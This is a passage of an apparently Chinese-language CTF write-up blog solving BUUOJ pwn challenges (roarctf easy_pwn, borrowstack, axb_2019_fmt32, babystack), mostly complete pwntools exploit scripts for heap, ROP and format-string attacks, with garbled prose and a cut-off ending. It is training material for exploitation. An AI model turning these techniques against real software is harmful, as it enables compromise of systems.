class="code"><pre><span class="line">create(<span class="number">0x60</span>) <span class="comment">#5 (on 2&#x27;s address)</span></span><br><span class="line">drop(<span class="number">2</span>)</span><br><span class="line">write(<span class="number">5</span>, <span class="number">0x8</span>, p64(fake_chunk))</span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#5 (2)</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#6 fake chunk</span></span><br><span class="line">realloc_addr=libc_base+libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>malloc_hook åŠ«æŒä¸º realloc ï¼Œrealloc_hook åŠ«æŒä¸º onegadget ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">11</span> + p64(one_gadget + libc_base) + p64(realloc_addr)</span><br><span class="line">write(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./roarctf_2019_easy_pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25955</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">  cmd(<span class="number">1</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">  cmd(<span class="number">2</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">drop</span>(<span class="params">index</span>):</span></span><br><span class="line">  cmd(<span class="number">3</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  cmd(<span class="number">4</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x58</span> + <span class="number">0xa</span>, <span class="string">&#x27;a&#x27;</span>* <span class="number">0x58</span> + <span class="string">&#x27;\xe1&#x27;</span>)</span><br><span class="line">drop(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>) <span class="comment">#2 is unsortbin</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = address -  <span class="number">0x3c4b20</span> - <span class="number">0x58</span></span><br><span class="line">main_arean = address - <span class="number">0x58</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">fake_chunk = main_arean - <span class="number">0x33</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#5 (on 2&#x27;s address)</span></span><br><span class="line">drop(<span class="number">2</span>)</span><br><span class="line">write(<span class="number">5</span>, <span class="number">0x8</span>, p64(fake_chunk))</span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#5 = 2</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#6 fake chunk</span></span><br><span class="line">realloc_addr=libc_base+libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">11</span> + p64(one_gadget + libc_base) + p64(realloc_addr)</span><br><span class="line">write(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x33-gyctf-2020-borrowstack"><a href="#0x33-gyctf-2020-borrowstack" class="headerlink" title="0x33.gyctf_2020_borrowstack"></a>0x33.gyctf_2020_borrowstack</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[<span class="number">96</span>]; // [rsp+0h] [rbp-60h] BYREF</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  read(<span class="number">0</span>, buf, 0x70uLL);</span><br><span class="line">  puts(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;bank, 0x100uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å…¶ä»–å‡½æ•°ã€‚</p><p>ç¬¬ä¸€æ¬¡read çš„å¤§å°æ°å¥½å¯ä»¥è¦†å†™retåœ°å€ã€‚</p><p>è¿ç§»æ ˆåˆ°bssæ®µï¼Œç„¶åç¬¬äºŒä¸ªreadå†™ropï¼Œåœ¨ä¹‹åæ‰§è¡Œonegadgetã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./gyctf_2020_borrowstack&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29529</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./gyctf_2020_borrowstack&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">leave_ret = <span class="number">0x400699</span></span><br><span class="line">ret = <span class="number">0x4004c9</span> </span><br><span class="line">pop_rdi_ret = <span class="number">0x400703</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(bss_addr) + p64(leave_ret)</span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">payload = p64(ret) * <span class="number">20</span> + p64(pop_rdi_ret) +p64(puts_got)+p64(puts_plt)+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="number">0x68</span>*<span class="string">&#x27;A&#x27;</span>+ p64(base + one_gadget)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x34-axb-2019-fmt32"><a href="#0x34-axb-2019-fmt32" class="headerlink" title="0x34.axb_2019_fmt32"></a>0x34.axb_2019_fmt32</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">257</span>]; <span class="comment">// [esp+Fh] [ebp-239h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">300</span>]; <span class="comment">// [esp+110h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+23Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Hello,I am a computer Repeater updated.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So I&#x27;ll answer whatever you say!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="keyword">sizeof</span>(format));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="built_in">sprintf</span>(format, <span class="string">&quot;Repeater:%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what you input is really long!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ ./axb_2019_fmt32 </span><br><span class="line">Hello,I am a computer Repeater updated.</span><br><span class="line">After a lot of machine learning,I know that the essence of man is a reread machine!</span><br><span class="line">So I&#x27;ll answer whatever you say!</span><br><span class="line">Please tell me:aaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.</span><br><span class="line">Repeater:aaaaa0x804888d.0xffffce5f.0xf7ffd53c.0xffffce68.0xf7fd95c5.0x46.0x61ffcf54.0x61616161.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.</span><br></pre></td></tr></table></figure><p>è¾“å…¥ä¸€ä¸²aæµ‹è¯•ä¸‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> stack 24</span></span><br><span class="line">00:0000â”‚ esp    0xffffce3c â€”â–¸ 0x8048700 (main+261) â—‚â€” add    esp, 0x10</span><br><span class="line">01:0004â”‚        0xffffce40 â€”â–¸ 0xffffcf60 â—‚â€” 0x0</span><br><span class="line">02:0008â”‚        0xffffce44 â€”â–¸ 0x804888d â—‚â€” push   edx /* &#x27;Repeater:%s\n&#x27; */</span><br><span class="line">03:000câ”‚        0xffffce48 â€”â–¸ 0xffffce5f â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">04:0010â”‚        0xffffce4c â€”â–¸ 0xf7ffd53c (_rtld_global+1308) â€”â–¸ 0xf7fd9000 â—‚â€” jg     0xf7fd9047</span><br><span class="line">05:0014â”‚        0xffffce50 â€”â–¸ 0xffffce68 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">06:0018â”‚        0xffffce54 â€”â–¸ 0xf7fd95c5 â—‚â€” jb     0xf7fd962c /* &#x27;realloc&#x27; */</span><br><span class="line">07:001câ”‚        0xffffce58 â—‚â€” 0x0</span><br><span class="line">08:0020â”‚ ecx-3  0xffffce5c â—‚â€” 0x61ffcf54</span><br><span class="line">09:0024â”‚        0xffffce60 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">... â†“</span><br><span class="line">0f:003câ”‚        0xffffce78 â—‚â€” 0x6161 /* &#x27;aa&#x27; */</span><br><span class="line">10:0040â”‚        0xffffce7c â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ï¼›</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºéœ€è¦åˆ©ç”¨%nå†™å…¥çš„æ•°æ®ï¼Œé‡‡ç”¨å­—å…¸å½¢å¼ï¼Œæˆ‘ä»¬è¦å°†printfçš„GOTæ•°æ®æ”¹ä¸ºsystemå‡½æ•°åœ°å€ï¼Œå°±å†™æˆ&#123;printfGOT: systemAddress&#125;ï¼›æœ¬é¢˜æ˜¯å°†0804a048å¤„æ”¹ä¸º0x2223322</span><br><span class="line">ç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºå·²ç»è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°ï¼Œè¿™é‡Œæ²¡æœ‰ï¼Œä¸º0ï¼Œé‡‡ç”¨é»˜è®¤å€¼å³å¯ï¼›</span><br><span class="line">ç¬¬å››ä¸ªå‚æ•°è¡¨ç¤ºå†™å…¥æ–¹å¼ï¼Œæ˜¯æŒ‰å­—èŠ‚ï¼ˆbyteï¼‰ã€æŒ‰åŒå­—èŠ‚ï¼ˆshortï¼‰è¿˜æ˜¯æŒ‰å››å­—èŠ‚ï¼ˆintï¼‰ï¼Œå¯¹åº”ç€hhnã€hnå’Œnï¼Œé»˜è®¤å€¼æ˜¯byteï¼Œå³æŒ‰hhnå†™ã€‚</span><br><span class="line">fmtstr_payloadå‡½æ•°è¿”å›çš„å°±æ˜¯payload</span><br></pre></td></tr></table></figure><p>å…·ä½“å¯ä»¥å»çœ‹ï¼š<a href="https://docs.pwntools.com/en/stable/fmtstr.html">https://docs.pwntools.com/en/stable/fmtstr.html</a></p><p>exp1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./axb_2019_fmt32&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26417</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_fmt32&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">prt_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>+p32(prt_got)+<span class="string">&quot;aaaa&quot;</span>+<span class="string">&quot;%8$s&quot;</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">printf_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(printf_addr)</span><br><span class="line">base  = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x3a80c</span> +base</span><br><span class="line">system_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> + fmtstr_payload(<span class="number">8</span>,&#123;prt_got:one_gadget&#125;,numbwritten = <span class="number">0xa</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;cat flag\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>exp2:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./axb_2019_fmt32&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26417</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_fmt32&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">prt_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>+p32(prt_got)+<span class="string">&quot;aaaa&quot;</span>+<span class="string">&quot;%8$s&quot;</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">printf_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(printf_addr)</span><br><span class="line">base  = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x3ac72</span> +base</span><br><span class="line">system_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> + fmtstr_payload(<span class="number">8</span>,&#123;prt_got:system_add&#125;,numbwritten = <span class="number">0xa</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;;cat flag\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x35-others-babystack"><a href="#0x35-others-babystack" class="headerlink" title="0x35.others_babystack"></a>0x35.others_babystack</h1><p>æŸ¥çœ‹ä¿æŠ¤ï¼šå¼€äº†canary</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec babystack </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/babystack&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>mainï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = input();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:                                   <span class="comment">// print</span></span><br><span class="line">        <span class="built_in">puts</span>(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:                                   <span class="comment">// store</span></span><br><span class="line">        read(<span class="number">0</span>, s, <span class="number">0x100</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        puts_(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    puts_(&amp;unk_400AE7);<span class="comment">//æ¢è¡Œ</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>storeçš„readå‡½æ•°æœ‰æº¢å‡º</p><p><code>payload = &#39;a&#39;*(0x90-8)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> stack 32</span></span><br><span class="line">00:0000â”‚ rsp  0x7fffffffdde8 â€”â–¸ 0x400884 â—‚â€” 0x7f00cc7d83cc4589</span><br><span class="line">01:0008â”‚      0x7fffffffddf0 